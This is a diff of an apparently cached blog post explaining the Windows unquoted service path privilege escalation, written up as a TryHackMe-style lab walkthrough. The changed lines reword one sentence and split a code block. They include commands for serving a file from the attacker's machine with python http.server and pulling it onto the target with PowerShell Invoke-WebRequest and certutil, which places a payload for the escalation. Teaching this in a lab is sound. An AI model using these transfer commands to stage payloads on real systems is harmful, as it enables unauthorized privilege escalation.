@@ -1,4 +1,4 @@
-I"ÜZ<h1 id="what-is-unquoted-service-path-">What is Unquoted Service Path ?</h1>
+I"s`<h1 id="what-is-unquoted-service-path-">What is Unquoted Service Path ?</h1>
 
 <p><strong>Unquoted Service Path</strong> is a vulnerability that occurs when a service is created with a <strong>service path</strong> without appropriate
 quoting surrounding the path string, and if the path contains spaces, that can end up with a <strong>privilege escalation</strong> with the
@@ -16,7 +16,8 @@ by looking at its full path.</p>
 <br />Basically, the system will interpret the path as a full string. 
 <br />
 <br />
-However, if the full path of the service file is not enclosed within quotation marks just like the following example:</p>
+However, if the full path of the service file is not enclosed within quotation marks just like the following example, things are
+getting tricky:</p>
 <ul>
   <li>Path of the vulnerable service -&gt; C:\Program Files\a folder\b folder\c folder\vulnservice.exe</li>
 </ul>
@@ -213,11 +214,15 @@ binary back to my machine.</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash">python <span class="nt">-m</span> http.server 80</code></pre></figure>
 
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}"</span><span class="w">
+</span><span class="n">certutil.exe</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">http://</span><span class="p">{</span><span class="n">YOUR</span><span class="w"> </span><span class="nx">SERVER</span><span class="w"> </span><span class="nx">IP</span><span class="p">(</span><span class="n">THM</span><span class="w"> </span><span class="nx">IP</span><span class="p">)}:</span><span class="mi">80</span><span class="n">/</span><span class="p">{</span><span class="n">THE</span><span class="w"> </span><span class="nx">FILE</span><span class="w"> </span><span class="nx">YOU</span><span class="w"> </span><span class="nx">WANT</span><span class="w"> </span><span class="nx">TO</span><span class="w"> </span><span class="nx">DOWNLOAD</span><span class="p">}</span></code></pre></figure>
+
 <p><img src="/assets/img/posts/unquoted-service-path-vulnerability/23.jpg" alt="" /><br /><br />
 <br />You can download any file from the running python server by using one of these utilites.</p>
 
-<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}"</span><span class="w">
-</span><span class="n">certutil.exe</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">http://</span><span class="p">{</span><span class="n">YOUR</span><span class="w"> </span><span class="nx">SERVER</span><span class="w"> </span><span class="nx">IP</span><span class="p">(</span><span class="n">THM</span><span class="w"> </span><span class="nx">IP</span><span class="p">)}:</span><span class="mi">80</span><span class="n">/</span><span class="p">{</span><span class="n">THE</span><span class="w"> </span><span class="nx">FILE</span><span class="w"> </span><span class="nx">YOU</span><span class="w"> </span><span class="nx">WANT</span><span class="w"> </span><span class="nx">TO</span><span class="w"> </span><span class="nx">DOWNLOAD</span><span class="p">}</span></code></pre></figure>
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}"</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">certutil.exe</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">http://</span><span class="p">{</span><span class="n">YOUR</span><span class="w"> </span><span class="nx">SERVER</span><span class="w"> </span><span class="nx">IP</span><span class="p">(</span><span class="n">THM</span><span class="w"> </span><span class="nx">IP</span><span class="p">)}:</span><span class="mi">80</span><span class="n">/</span><span class="p">{</span><span class="n">THE</span><span class="w"> </span><span class="nx">FILE</span><span class="w"> </span><span class="nx">YOU</span><span class="w"> </span><span class="nx">WANT</span><span class="w"> </span><span class="nx">TO</span><span class="w"> </span><span class="nx">DOWNLOAD</span><span class="p">}</span></code></pre></figure>
 
 <p>Double-check to see if the executable downloaded successfully into the directory to which you have the write access.</p>
 
